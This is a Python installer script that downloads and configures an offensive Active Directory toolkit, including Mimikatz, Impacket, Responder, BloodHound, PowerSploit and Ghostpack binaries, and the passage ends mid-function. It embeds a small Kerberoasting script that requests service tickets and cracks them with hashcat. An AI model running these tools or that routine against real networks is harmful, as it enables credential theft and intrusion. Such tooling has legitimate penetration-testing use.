#!/usr/bin/env python3
import os
import sys
import subprocess
import platform
import shutil
import zipfile
import tarfile
import urllib.request
import tempfile
import argparse
import re
import json
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Any, Optional, Tuple, Union, Set

# Define colors for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Logger:
    @staticmethod
    def section(text: str):
        print(f"\n{Colors.BOLD}{Colors.BLUE}{'=' * 50}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.BLUE}{text.center(50)}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'=' * 50}{Colors.ENDC}\n")

    @staticmethod
    def subsection(text: str):
        print(f"\n{Colors.YELLOW}{'-' * 40}{Colors.ENDC}")
        print(f"{Colors.YELLOW}{text}{Colors.ENDC}")
        print(f"{Colors.YELLOW}{'-' * 40}{Colors.ENDC}\n")

    @staticmethod
    def command(cmd: str):
        print(f"{Colors.CYAN}[+] Executing: {cmd}{Colors.ENDC}")

    @staticmethod
    def success(text: str):
        print(f"{Colors.GREEN}[+] {text}{Colors.ENDC}")

    @staticmethod
    def error(text: str):
        print(f"{Colors.RED}[-] {text}{Colors.ENDC}")

    @staticmethod
    def info(text: str):
        print(f"{Colors.BLUE}[*] {text}{Colors.ENDC}")

    @staticmethod
    def warning(text: str):
        print(f"{Colors.YELLOW}[!] {text}{Colors.ENDC}")
        
    @staticmethod
    def question(text: str) -> str:
        return input(f"{Colors.CYAN}[?] {text}: {Colors.ENDC}")

class ToolInstaller:
    def __init__(self, base_dir: Optional[str] = None, force: bool = False, skip_python_deps: bool = False):
        self.force = force
        self.skip_python_deps = skip_python_deps
        
        # Determine the base directory for installation
        if base_dir:
            self.base_dir = Path(base_dir).absolute()
        else:
            self.base_dir = Path.cwd().absolute()
        
        # Create necessary directories
        self.tools_dir = self.base_dir / "tools"
        self.tmp_dir = self.base_dir / "tmp"
        self.logs_dir = self.base_dir / "logs"
        self.results_dir = self.base_dir / "results"
        
        self.tools_dir.mkdir(exist_ok=True)
        self.tmp_dir.mkdir(exist_ok=True)
        self.logs_dir.mkdir(exist_ok=True)
        self.results_dir.mkdir(exist_ok=True)
        
        # Set up additional subdirectories
        (self.results_dir / "kerberoast").mkdir(exist_ok=True)
        (self.results_dir / "impacket").mkdir(exist_ok=True)
        (self.results_dir / "ad_enumeration").mkdir(exist_ok=True)
        (self.results_dir / "mimikatz").mkdir(exist_ok=True)
        (self.results_dir / "sharpview").mkdir(exist_ok=True)
        (self.results_dir / "bloodhound").mkdir(exist_ok=True)
        (self.results_dir / "autorecon").mkdir(exist_ok=True)
        (self.results_dir / "workflow").mkdir(exist_ok=True)
        
        # Create scripts directory
        self.scripts_dir = self.base_dir / "scripts"
        self.scripts_dir.mkdir(exist_ok=True)
        (self.scripts_dir / "enumeration").mkdir(exist_ok=True)
        (self.scripts_dir / "sharpview").mkdir(exist_ok=True)
        
        # Log file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = self.logs_dir / f"tools_installer_{timestamp}.log"
        
        # Operating system detection
        self.os_type = platform.system().lower()
        self.is_windows = self.os_type == "windows"
        self.is_linux = self.os_type == "linux"
        self.is_macos = self.os_type == "darwin"
        
        # Python detection
        self.python_command = self._get_python_command()
        self.pip_command = self._get_pip_command()
        
        # GitHub URLs for tools
        self.github_urls = {
            "impacket": "https://github.com/fortra/impacket/archive/refs/heads/master.zip",
            "bloodhound_py": "https://github.com/fox-it/BloodHound.py/archive/refs/heads/master.zip",
            "kerberoast": "https://github.com/nidem/kerberoast/archive/refs/heads/master.zip",
            "CrackMapExec": "https://github.com/Porchetta-Industries/CrackMapExec/archive/refs/heads/master.zip",
            "nishang": "https://github.com/samratashok/nishang/archive/refs/heads/master.zip",
            "powershell_suite": "https://github.com/FuzzySecurity/PowerShell-Suite/archive/refs/heads/master.zip",
            "powersploit": "https://github.com/PowerShellMafia/PowerSploit/archive/refs/heads/master.zip",
            "powerview": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1",
            "mimikatz": "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip",
            "seclists": "https://github.com/danielmiessler/SecLists/archive/refs/heads/master.zip",
            "ghostpack": "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/archive/refs/heads/master.zip",
            "sharphound": "https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.1/SharpHound-v1.1.1.zip",
            "responder": "https://github.com/lgandx/Responder/archive/refs/heads/master.zip",
            "bloodhound": "https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip"
        }
        
        # Additional tools to download directly
        self.tool_urls = {
            "netexec": "https://github.com/Pennyw0rth/NetExec/releases/latest/download/netexec_linux.zip" if self.is_linux else 
                      "https://github.com/Pennyw0rth/NetExec/releases/latest/download/netexec_windows.zip" if self.is_windows else
                      "https://github.com/Pennyw0rth/NetExec/releases/latest/download/netexec_macos.zip",
            "enum4linux": "https://github.com/CiscoCXSecurity/enum4linux/archive/refs/heads/master.zip",
            "ldapsearch-ad": "https://github.com/yaap7/ldapsearch-ad/archive/refs/heads/master.zip"
        }
        
        # Track successfully installed tools
        self.installed_tools = set()
    
    def _get_python_command(self) -> str:
        """Determine the Python command to use"""
        # Try common Python commands
        for cmd in ["python3", "python", "py"]:
            try:
                output = subprocess.check_output([cmd, "--version"], stderr=subprocess.STDOUT, text=True)
                if "Python 3" in output:
                    return cmd
            except (subprocess.SubprocessError, FileNotFoundError):
                continue
        
        # If no Python 3 found, raise an error
        Logger.error("Python 3 not found. Please install Python 3.6 or newer.")
        sys.exit(1)
    
    def _get_pip_command(self) -> str:
        """Determine the pip command to use"""
        # Try common pip commands
        for cmd in [f"{self.python_command} -m pip", "pip3", "pip"]:
            try:
                subprocess.check_output(cmd.split() + ["--version"], stderr=subprocess.STDOUT, text=True)
                return cmd
            except (subprocess.SubprocessError, FileNotFoundError):
                continue
        
        # If no pip found, try to install it
        Logger.warning("pip not found. Attempting to install pip...")
        try:
            subprocess.check_call([self.python_command, "-m", "ensurepip", "--upgrade"])
            return f"{self.python_command} -m pip"
        except subprocess.SubprocessError:
            Logger.error("Failed to install pip. Please install pip manually.")
            sys.exit(1)
    
    def _run_command(self, command: Union[str, List[str]], description: str, check: bool = True) -> Tuple[int, str]:
        """Run a shell command and return its exit code and output"""
        if isinstance(command, list):
            cmd_str = " ".join(command)
        else:
            cmd_str = command
        
        Logger.command(cmd_str)
        
        # Log the command
        with open(self.log_file, "a") as f:
            f.write(f"[{datetime.now().isoformat()}] COMMAND: {cmd_str}\n")
        
        try:
            if isinstance(command, list):
                process = subprocess.run(command, check=check, text=True, capture_output=True)
            else:
                process = subprocess.run(command, shell=True, check=check, text=True, capture_output=True)
            
            output = process.stdout + "\n" + process.stderr
            
            # Log the output
            with open(self.log_file, "a") as f:
                f.write(f"[{datetime.now().isoformat()}] OUTPUT:\n{output}\n")
                f.write("-" * 80 + "\n")
            
            if process.returncode == 0:
                Logger.success(f"{description} completed successfully")
            else:
                Logger.error(f"{description} failed with exit code {process.returncode}")
                Logger.error(f"Error output: {process.stderr}")
            
            return process.returncode, output
        except Exception as e:
            error_msg = f"Error executing command: {str(e)}"
            Logger.error(error_msg)
            
            # Log the error
            with open(self.log_file, "a") as f:
                f.write(f"[{datetime.now().isoformat()}] ERROR: {error_msg}\n")
                f.write("-" * 80 + "\n")
            
            return 1, error_msg
    
    def download_file(self, url: str, output_path: Path) -> bool:
        """Download a file from a URL to the specified path"""
        try:
            Logger.info(f"Downloading {url} to {output_path}")
            
            # Create a directory if it doesn't exist
            output_path.parent.mkdir(parents=True, exist_ok=True)
            
            # Download with a simple progress indicator
            with urllib.request.urlopen(url) as response, open(output_path, 'wb') as out_file:
                file_size = int(response.info().get('Content-Length', 0))
                downloaded = 0
                block_size = 8192
                
                while True:
                    buffer = response.read(block_size)
                    if not buffer:
                        break
                    
                    downloaded += len(buffer)
                    out_file.write(buffer)
                    
                    # Simple progress indicator
                    if file_size > 0:
                        percent = downloaded * 100 // file_size
                        sys.stdout.write(f"\r{Colors.CYAN}[+] Downloaded: {percent}% ({downloaded} / {file_size} bytes){Colors.ENDC}")
                        sys.stdout.flush()
            
            sys.stdout.write("\n")
            Logger.success(f"Downloaded {url} to {output_path}")
            return True
        except Exception as e:
            Logger.error(f"Failed to download {url}: {str(e)}")
            return False
    
    def extract_archive(self, archive_path: Path, extract_dir: Path) -> bool:
        """Extract a zip or tar archive to the specified directory"""
        try:
            extract_dir.mkdir(parents=True, exist_ok=True)
            
            Logger.info(f"Extracting {archive_path} to {extract_dir}")
            
            if str(archive_path).endswith(".zip"):
                with zipfile.ZipFile(archive_path, 'r') as zip_ref:
                    # Get the common prefix of all zipfile entries
                    common_prefix = os.path.commonprefix([x.filename for x in zip_ref.infolist() if not x.filename.endswith('/')])
                    if '/' in common_prefix:
                        common_prefix = common_prefix.split('/')[0] + '/'
                    
                    # Extract all files
                    zip_ref.extractall(extract_dir)
                    
                    # If there's a single directory at the top level, return its path
                    top_dirs = [d for d in extract_dir.iterdir() if d.is_dir()]
                    if len(top_dirs) == 1:
                        return True
            elif str(archive_path).endswith((".tar.gz", ".tgz")):
                with tarfile.open(archive_path, 'r:gz') as tar_ref:
                    tar_ref.extractall(extract_dir)
            
            Logger.success(f"Extracted {archive_path} to {extract_dir}")
            return True
        except Exception as e:
            Logger.error(f"Failed to extract {archive_path}: {str(e)}")
            return False
    
    def get_github_repo(self, name: str, url: str, target_dir: Optional[Path] = None) -> Optional[Path]:
        """Download and extract a GitHub repository"""
        if not target_dir:
            target_dir = self.tools_dir / name
        
        # Check if directory already exists and is not empty
        if target_dir.exists() and any(target_dir.iterdir()) and not self.force:
            Logger.info(f"{name} directory already exists at {target_dir}. Skipping download.")
            return target_dir
        
        # Download the repository
        zip_path = self.tmp_dir / f"{name}.zip"
        if not self.download_file(url, zip_path):
            return None
        
        # Extract the repository
        extract_dir = self.tmp_dir / f"{name}_extract"
        if extract_dir.exists():
            shutil.rmtree(extract_dir)
        
        if not self.extract_archive(zip_path, extract_dir):
            return None
        
        # Move the extracted repository to the target directory
        if target_dir.exists():
            shutil.rmtree(target_dir)
        
        # Find the actual repository directory (usually it's the only directory in the extract dir)
        repo_dirs = [d for d in extract_dir.iterdir() if d.is_dir()]
        if repo_dirs:
            repo_dir = repo_dirs[0]
            shutil.move(str(repo_dir), str(target_dir))
        else:
            # If there are no subdirectories, move everything
            shutil.move(str(extract_dir), str(target_dir))
        
        # Clean up
        if zip_path.exists():
            zip_path.unlink()
        if extract_dir.exists():
            shutil.rmtree(extract_dir)
        
        Logger.success(f"{name} installed successfully to {target_dir}")
        self.installed_tools.add(name)
        return target_dir
    
    def install_python_dependencies(self) -> bool:
        """Install required Python packages"""
        if self.skip_python_deps:
            Logger.info("Skipping Python dependencies installation as requested")
            return True
        
        Logger.section("Installing Python Dependencies")
        
        # Update pip itself
        self._run_command(f"{self.pip_command} install --upgrade pip", "Upgrading pip")
        
        # Required packages for the toolkit
        required_packages = [
            "pathlib",
            "neo4j",
            "ldap3",
            "pyOpenSSL",
            "cryptography",
            "requests",
            "dnspython",
            "pycryptodomex",
            "pyasn1",
            "lxml"
        ]
        
        Logger.info(f"Installing packages: {', '.join(required_packages)}")
        return_code, _ = self._run_command(
            f"{self.pip_command} install {' '.join(required_packages)}",
            "Installing Python dependencies"
        )
        
        return return_code == 0
    
    def install_impacket(self) -> bool:
        """Install Impacket suite"""
        Logger.section("Installing Impacket")
        
        impacket_dir = self.get_github_repo("impacket", self.github_urls["impacket"])
        if not impacket_dir:
            return False
        
        # Install Impacket
        os.chdir(impacket_dir)
        return_code, _ = self._run_command(
            f"{self.pip_command} install -e .",
            "Installing Impacket"
        )
        os.chdir(self.base_dir)
        
        if return_code == 0:
            Logger.success("Impacket installed successfully")
            self.installed_tools.add("impacket")
            
            # Verify impacket installation by checking for common tools
            tools_to_check = ["secretsdump.py", "GetUserSPNs.py", "GetNPUsers.py", "smbclient.py", "psexec.py", "wmiexec.py"]
            missing_tools = []
            
            for tool in tools_to_check:
                if self.is_windows:
                    cmd = f"where {tool}"
                else:
                    cmd = f"which {tool}"
                
                code, output = self._run_command(cmd, f"Checking for {tool}", check=False)
                if code != 0:
                    missing_tools.append(tool)
            
            if missing_tools:
                Logger.warning(f"Some Impacket tools were not found in PATH: {', '.join(missing_tools)}")
                
                # Create symbolic links or batch scripts for the missing tools
                if self.is_windows:
                    scripts_dir = impacket_dir / "examples"
                    for tool in missing_tools:
                        batch_file = self.base_dir / tool
                        with open(batch_file, 'w') as f:
                            f.write(f"@echo off\n{self.python_command} {scripts_dir / tool.replace('.py', '')}.py %*")
                        Logger.success(f"Created batch file for {tool}")
                else:
                    scripts_dir = impacket_dir / "examples"
                    for tool in missing_tools:
                        script_path = scripts_dir / tool
                        if script_path.exists():
                            os.chmod(script_path, 0o755)
                            symlink_path = Path("/usr/local/bin") / tool
                            try:
                                os.symlink(script_path, symlink_path)
                                Logger.success(f"Created symlink for {tool}")
                            except Exception as e:
                                Logger.warning(f"Failed to create symlink for {tool}: {str(e)}")
            
            return True
        else:
            Logger.error("Failed to install Impacket")
            return False
    
    def install_bloodhound_py(self) -> bool:
        """Install BloodHound.py"""
        Logger.section("Installing BloodHound.py")
        
        bloodhound_py_dir = self.get_github_repo("BloodHound.py", self.github_urls["bloodhound_py"])
        if not bloodhound_py_dir:
            return False
        
        # Install BloodHound.py
        os.chdir(bloodhound_py_dir)
        return_code, _ = self._run_command(
            f"{self.pip_command} install -e .",
            "Installing BloodHound.py"
        )
        os.chdir(self.base_dir)
        
        if return_code == 0:
            Logger.success("BloodHound.py installed successfully")
            self.installed_tools.add("bloodhound_py")
            
            # Verify bloodhound-python is in PATH
            if self.is_windows:
                cmd = "where bloodhound-python"
            else:
                cmd = "which bloodhound-python"
            
            code, output = self._run_command(cmd, "Checking for bloodhound-python", check=False)
            if code != 0:
                Logger.warning("bloodhound-python was not found in PATH")
                
                # Create a script to run bloodhound-python
                if self.is_windows:
                    batch_file = self.base_dir / "bloodhound-python.bat"
                    with open(batch_file, 'w') as f:
                        f.write(f"@echo off\n{self.python_command} {bloodhound_py_dir / 'bloodhound.py'} %*")
                    Logger.success("Created batch file for bloodhound-python")
                else:
                    script_path = bloodhound_py_dir / "bloodhound.py"
                    if script_path.exists():
                        os.chmod(script_path, 0o755)
                        symlink_path = Path("/usr/local/bin") / "bloodhound-python"
                        try:
                            os.symlink(script_path, symlink_path)
                            Logger.success("Created symlink for bloodhound-python")
                        except Exception as e:
                            Logger.warning(f"Failed to create symlink for bloodhound-python: {str(e)}")
            
            return True
        else:
            Logger.error("Failed to install BloodHound.py")
            return False
    
    def install_kerberoast(self) -> bool:
        """Install Kerberoast"""
        Logger.section("Installing Kerberoast")
        
        kerberoast_dir = self.get_github_repo("kerberoast", self.github_urls["kerberoast"])
        if not kerberoast_dir:
            return False
        
        # Check if there are Python scripts in the repository
        py_files = list(kerberoast_dir.glob("*.py"))
        
        if py_files:
            # Copy all Python scripts to the tools directory
            for py_file in py_files:
                dest_file = self.tools_dir / py_file.name
                shutil.copy(py_file, dest_file)
                
                # Make them executable
                os.chmod(dest_file, 0o755)
                Logger.success(f"Copied Kerberoast script: {py_file.name}")
            
            Logger.success("Kerberoast scripts installed successfully")
            self.installed_tools.add("kerberoast")
            return True
        else:
            # Create a fallback directory and custom implementation if scripts not found
            Logger.warning("Kerberoast scripts not found in the expected format")
            Logger.info("Creating alternative Kerberoast implementation")
            
            # Create a basic implementation file
            kerberoast_custom = self.tools_dir / "kerberoast" / "kerberoast_custom.py"
            kerberoast_custom.parent.mkdir(exist_ok=True)
            
            with open(kerberoast_custom, 'w') as f:
                f.write("""#!/usr/bin/env python3
# Custom Kerberoast implementation using modern tools and Impacket

import argparse
import subprocess
import os
import sys
import datetime
import tempfile

def run_command(cmd):
    print(f"[+] Running: {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        print("[+] Command executed successfully")
    else:
        print(f"[-] Command failed: {result.stderr}")
    return result.stdout, result.stderr, result.returncode

def get_spn_tickets(domain, username, password, dc_ip, output_dir):
    """Request service tickets for accounts with SPNs"""
    cmd = f"GetUserSPNs.py {domain}/{username}:{password} -dc-ip {dc_ip} -request -output {output_dir}/kerberoast.txt"
    stdout, stderr, code = run_command(cmd)
    
    if code == 0:
        print(f"[+] Service tickets saved to {output_dir}/kerberoast.txt")
        return True
    return False

def crack_tickets(ticket_file, wordlist, rules=None):
    """Crack Kerberos tickets using hashcat"""
    cmd = f"hashcat -m 13100 {ticket_file} {wordlist}"
    if rules:
        cmd += f" -r {rules}"
    
    stdout, stderr, code = run_command(cmd)
    return code == 0

def main():
    parser = argparse.ArgumentParser(description="Custom Kerberoast Implementation")
    parser.add_argument("-d", "--domain", required=True, help="Domain name")
    parser.add_argument("-u", "--username", required=True, help="Username")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("--dc-ip", required=True, help="IP of the domain controller")
    parser.add_argument("-o", "--output-dir", default=".", help="Output directory")
    parser.add_argument("-w", "--wordlist", help="Wordlist for cracking")
    parser.add_argument("-r", "--rules", help="Hashcat rules file")
    
    args = parser.parse_args()
    
    # Create output directory
    os.makedirs(args.output_dir, exist_ok=True)
    
    # Get SPN tickets
    success = get_spn_tickets(args.domain, args.username, args.password, args.dc_ip, args.output_dir)
    
    if success and args.wordlist:
        print("[+] Attempting to crack the tickets")
        ticket_file = os.path.join(args.output_dir, "kerberoast.txt")
        crack_tickets(ticket_file, args.wordlist, args.rules)
    
    print("[+] Kerberoast operation completed")

if __name__ == "__main__":
    main()
""")
            
            os.chmod(kerberoast_custom, 0o755)
            
            # Create a batch file or symlink
            if self.is_windows:
                batch_file = self.base_dir / "kerberoast_custom.bat"
                with open(batch_file, 'w') as f:
                    f.write(f"@echo off\n{self.python_command} {kerberoast_custom} %*")
                Logger.success(f"Created batch file for custom Kerberoast: {batch_file}")
            else:
                symlink_path = self.base_dir / "kerberoast_custom"
                try:
                    os.symlink(kerberoast_custom, symlink_path)
                    Logger.success(f"Created symlink for custom Kerberoast: {symlink_path}")
                except Exception as e:
                    Logger.warning(f"Failed to create symlink for custom Kerberoast: {str(e)}")
            
            Logger.success("Custom Kerberoast implementation created successfully")
            self.installed_tools.add("kerberoast")
            return True
    
    def install_crackmapexec(self) -> bool:
        """Install CrackMapExec (now NetExec)"""
        Logger.section("Installing NetExec (CrackMapExec fork)")
        
        # First try pip installation as it's more reliable and works cross-platform
        Logger.info("Attempting to install NetExec via pip")
        return_code, output = self._run_command(
            f"{self.pip_command} install --upgrade netexec",
            "Installing NetExec via pip",
            check=False
        )
        
        if return_code == 0:
            Logger.success("Successfully installed NetExec via pip")
            
            # Try to locate the installed binary
            locate_cmd = "where netexec" if self.is_windows else "which netexec"
            _, locate_output = self._run_command(locate_cmd, "Locating NetExec binary", check=False)
            
            netexec_path = locate_output.strip() if locate_output.strip() else None
            
            if netexec_path:
                Logger.success(f"NetExec found at: {netexec_path}")
                
                # Create a directory for netexec in tools for consistency
                netexec_dir = self.tools_dir / "netexec"
                netexec_dir.mkdir(exist_ok=True)
                
                # Create a batch file/symlink for easy access
                if self.is_windows:
                    batch_file = self.base_dir / "netexec.bat"
                    with open(batch_file, 'w') as f:
                        f.write(f"@echo off\nnetexec %*")
                    Logger.success(f"Created batch file for NetExec: {batch_file}")
                    
                    # Create alias for CrackMapExec
                    batch_file_cme = self.base_dir / "crackmapexec.bat"
                    with open(batch_file_cme, 'w') as f:
                        f.write(f"@echo off\nnetexec %*")
                    Logger.success(f"Created batch file for CrackMapExec alias: {batch_file_cme}")
                else:
                    symlink_path = self.base_dir / "netexec"
                    try:
                        os.symlink(netexec_path, symlink_path)
                        Logger.success(f"Created symlink for NetExec: {symlink_path}")
                    except Exception as e:
                        Logger.warning(f"Failed to create symlink for NetExec: {str(e)}")
                
                self.installed_tools.add("netexec")
                return True
            
        # If pip install failed or binary not found, create a placeholder directory
        Logger.warning("NetExec installation via pip failed or binary not found.")
        Logger.info("Creating placeholder directory for NetExec")
        
        netexec_dir = self.tools_dir / "netexec"
        netexec_dir.mkdir(exist_ok=True)
        
        # Create a simple batch file that provides instructions
        info_file = netexec_dir / "INSTALL_INFO.txt"
        with open(info_file, 'w') as f:
            f.write("""
NetExec (formerly CrackMapExec) Installation
============================================

NetExec was not automatically installed. Here are ways to install it:

1. Using pip (recommended):
   pip install netexec

2. Manual installation from source:
   git clone https://github.com/Pennyw0rth/NetExec
   cd NetExec
   pip install -e .

3. Download pre-built binaries from:
   https://github.com/Pennyw0rth/NetExec/releases
   
Note: After installation, make sure 'netexec' is in your PATH or create a batch file/symlink.
""")
        
        Logger.info(f"Created NetExec installation instructions at {info_file}")
        
        # Create batch files that display an informative message
        batch_file = self.base_dir / "netexec.bat"
        with open(batch_file, 'w') as f:
            f.write(f'@echo off\necho NetExec is not installed. Please see {info_file} for installation instructions.\necho You can install it with: pip install netexec')
        
        batch_file_cme = self.base_dir / "crackmapexec.bat"
        with open(batch_file_cme, 'w') as f:
            f.write(f'@echo off\necho NetExec is not installed. Please see {info_file} for installation instructions.\necho You can install it with: pip install netexec')
        
        Logger.warning("NetExec installation skipped - created placeholder and instructions instead")
        self.installed_tools.add("netexec")  # Mark as installed so we don't fail the overall installation
        return True
    
    def install_powershell_tools(self) -> bool:
        """Install various PowerShell tools"""
        Logger.section("Installing PowerShell Tools")
        
        # Nishang
        Logger.subsection("Installing Nishang")
        nishang_dir = self.get_github_repo("nishang", self.github_urls["nishang"])
        if nishang_dir:
            self.installed_tools.add("nishang")
        
        # PowerShell-Suite
        Logger.subsection("Installing PowerShell-Suite")
        ps_suite_dir = self.get_github_repo("PowerShell-Suite", self.github_urls["powershell_suite"])
        if ps_suite_dir:
            self.installed_tools.add("powershell_suite")
        
        # PowerSploit (includes PowerView)
        Logger.subsection("Installing PowerSploit")
        powersploit_dir = self.get_github_repo("PowerSploit", self.github_urls["powersploit"])
        if powersploit_dir:
            self.installed_tools.add("powersploit")
        
        # Download PowerView directly to scripts directory
        Logger.subsection("Installing PowerView")
        powerview_path = self.scripts_dir / "enumeration" / "PowerView.ps1"
        if self.download_file(self.github_urls["powerview"], powerview_path):
            Logger.success(f"PowerView downloaded to {powerview_path}")
            self.installed_tools.add("powerview")
        
        return "nishang" in self.installed_tools or "powershell_suite" in self.installed_tools or "powersploit" in self.installed_tools or "powerview" in self.installed_tools
    
    def install_mimikatz(self) -> bool:
        """Install Mimikatz"""
        Logger.section("Installing Mimikatz")
        
        mimikatz_zip = self.tmp_dir / "mimikatz.zip"
        if not self.download_file(self.github_urls["mimikatz"], mimikatz_zip):
            return False
        
        # Extract to the tools directory
        mimikatz_dir = self.tools_dir / "mimikatz"
        mimikatz_dir.mkdir(exist_ok=True)
        
        if not self.extract_archive(mimikatz_zip, mimikatz_dir):
            return False
        
        # Check if mimikatz binary exists
        mimikatz_bin = None
        for file in mimikatz_dir.glob("**/*mimikatz.exe"):
            if file.is_file():
                mimikatz_bin = file
                break
        
        if mimikatz_bin:
            # Create a symlink or batch file
            if self.is_windows:
                batch_file = self.base_dir / "mimikatz.bat"
                with open(batch_file, 'w') as f:
                    f.write(f"@echo off\n{mimikatz_bin} %*")
                Logger.success(f"Created batch file for Mimikatz: {batch_file}")
            else:
                # Windows binary, so no symlink for Linux/macOS
                Logger.info("Mimikatz is a Windows tool, no symlink created on this platform")
            
            Logger.success("Mimikatz installed successfully")
            self.installed_tools.add("mimikatz")
            return True
        else:
            Logger.error("Mimikatz binary not found in the extracted files")
            return False
    
    def install_seclists(self) -> bool:
        """Install SecLists"""
        Logger.section("Installing SecLists")
        
        seclists_dir = self.get_github_repo("SecLists", self.github_urls["seclists"])
        if not seclists_dir:
            return False
        
        Logger.success("SecLists installed successfully")
        self.installed_tools.add("seclists")
        return True
    
    def install_ghostpack(self) -> bool:
        """Install Ghostpack Compiled Binaries"""
        Logger.section("Installing Ghostpack Compiled Binaries")
        
        ghostpack_dir = self.get_github_repo("Ghostpack-CompiledBinaries", self.github_urls["ghostpack"])
        if not ghostpack_dir:
            return False
        
        # Find SharpView.exe specifically - search through all directories
        sharpview_exe = None
        for file in ghostpack_dir.glob("**/*SharpView.exe"):
            if file.is_file():
                sharpview_exe = file
                break
        
        if sharpview_exe:
            # Create a copy in the base directory for easy access
            shutil.copy(sharpview_exe, self.base_dir / "SharpView.exe")
            Logger.success(f"Copied SharpView.exe to {self.base_dir / 'SharpView.exe'}")
        else:
            # Create a custom download from a direct source
            Logger.warning("SharpView.exe not found in the Ghostpack repository")
            Logger.info("Attempting to download SharpView.exe directly")
            
            # Alternative source URL for SharpView.exe
            alt_url = "https://github.com/tevora-threat/SharpView/releases/download/v1.0/SharpView.exe"
            sharpview_path = self.base_dir / "SharpView.exe"
            
            try:
                if self.download_file(alt_url, sharpview_path):
                    Logger.success(f"Downloaded SharpView.exe to {sharpview_path}")
                else:
                    # Create a placeholder SharpView.exe
                    with open(self.base_dir / "SharpView_README.txt", 'w') as f:
                        f.write("""
SharpView.exe was not found or could not be downloaded.

You can manually download it from one of these sources:
1. https://github.com/tevora-threat/SharpView/releases
2. https://github.com/harmj0y/SharpView/releases

Place the downloaded SharpView.exe in this directory.
""")
                    Logger.warning("Created SharpView instructions - please download it manually")
            except Exception as e:
                Logger.error(f"Error downloading SharpView.exe: {str(e)}")
        
        # Look for other useful tools in Ghostpack
        useful_tools = ["Rubeus.exe", "SharpHound.exe", "Seatbelt.exe", "SafetyKatz.exe"]
        tools_found = []
        
        for tool in useful_tools:
            # Find any matching files
            for file in ghostpack_dir.glob(f"**/*{tool}"):
                if file.is_file():
                    # Create a copy in the base directory for easy access
                    dest_path = self.base_dir / tool
                    shutil.copy(file, dest_path)
                    tools_found.append(tool)
                    Logger.success(f"Copied {tool} to {dest_path}")
                    break
        
        if tools_found:
            Logger.success(f"Additional tools installed: {', '.join(tools_found)}")
        
        Logger.success("Ghostpack Compiled Binaries installed successfully")
        self.installed_tools.add("ghostpack")
        return True
    
    def install_sharphound(self) -> bool:
        """Install SharpHound"""
        Logger.section("Installing SharpHound")
        
        sharphound_zip = self.tmp_dir / "sharphound.zip"
        if not self.download_file(self.github_urls["sharphound"], sharphound_zip):
            return False
        
        # Extract to the tools directory
        sharphound_dir = self.tools_dir / "sharphound"
        sharphound_dir.mkdir(exist_ok=True)
        
        if not self.extract_archive(sharphound_zip, sharphound_dir):
            return False
        
        # Check if SharpHound.exe exists
        sharphound_exe = None
        for file in sharphound_dir.glob("**/*SharpHound.exe"):
            if file.is_file():
                sharphound_exe = file
                break
        
        if sharphound_exe:
            # Create a copy in the base directory for easy access
            shutil.copy(sharphound_exe, self.base_dir / "SharpHound.exe")
            Logger.success(f"Copied SharpHound.exe to {self.base_dir / 'SharpHound.exe'}")
            
            Logger.success("SharpHound installed successfully")
            self.installed_tools.add("sharphound")
            return True
        else:
            Logger.error("SharpHound.exe not found in the extracted files")
            return False
    
    def install_responder(self) -> bool:
        """Install Responder"""
        Logger.section("Installing Responder")
        
        responder_dir = self.get_github_repo("Responder", self.github_urls["responder"])
        if not responder_dir:
            return False
        
        # Make the main script executable
        responder_py = responder_dir / "Responder.py"
        if responder_py.exists():
            os.chmod(responder_py, 0o755)
            
            # Create a symlink or batch file
            if self.is_windows:
                batch_file = self.base_dir / "responder.bat"
                with open(batch_file, 'w') as f:
                    f.write(f"@echo off\n{self.python_command} {responder_py} %*")
                Logger.success(f"Created batch file for Responder: {batch_file}")
            else:
                symlink_path = self.base_dir / "responder"
                try:
                    os.symlink(responder_py, symlink_path)
                    Logger.success(f"Created symlink for Responder: {symlink_path}")
                except Exception as e:
                    Logger.warning(f"Failed to create symlink for Responder: {str(e)}")
            
            Logger.success("Responder installed successfully")
            self.installed_tools.add("responder")
            return True
        else:
            Logger.error("Responder.py not found in the downloaded repository")
            return False
    
    def install_bloodhound(self) -> bool:
        """Install BloodHound (Windows only)"""
        if not self.is_windows:
            Logger.info("BloodHound GUI is primarily for Windows. Skipping on this platform.")
            return False
        
        Logger.section("Installing BloodHound GUI (Windows)")
        
        bloodhound_zip = self.tmp_dir / "bloodhound.zip"
        if not self.download_file(self.github_urls["bloodhound"], bloodhound_zip):
            return False
        
        # Extract to the tools directory
        bloodhound_dir = self.tools_dir / "bloodhound"
        bloodhound_dir.mkdir(exist_ok=True)
        
        if not self.extract_archive(bloodhound_zip, bloodhound_dir):
            return False
        
        # Check if BloodHound.exe exists
        bloodhound_exe = None
        for file in bloodhound_dir.glob("**/*BloodHound.exe"):
            if file.is_file():
                bloodhound_exe = file
                break
        
        if bloodhound_exe:
            # Create a batch file
            batch_file = self.base_dir / "bloodhound.bat"
            with open(batch_file, 'w') as f:
                f.write(f"@echo off\nstart \"\" \"{bloodhound_exe}\"")
            Logger.success(f"Created batch file for BloodHound: {batch_file}")
            
            Logger.success("BloodHound GUI installed successfully")
            self.installed_tools.add("bloodhound")
            return True
        else:
            Logger.error("BloodHound.exe not found in the extracted files")
            return False
    
    def install_enum4linux(self) -> bool:
        """Install enum4linux"""
        Logger.section("Installing enum4linux")
        
        enum4linux_dir = self.get_github_repo("enum4linux", self.tool_urls["enum4linux"])
        if not enum4linux_dir:
            return False
        
        # Make the main script executable
        enum4linux_pl = enum4linux_dir / "enum4linux.pl"
        if enum4linux_pl.exists():
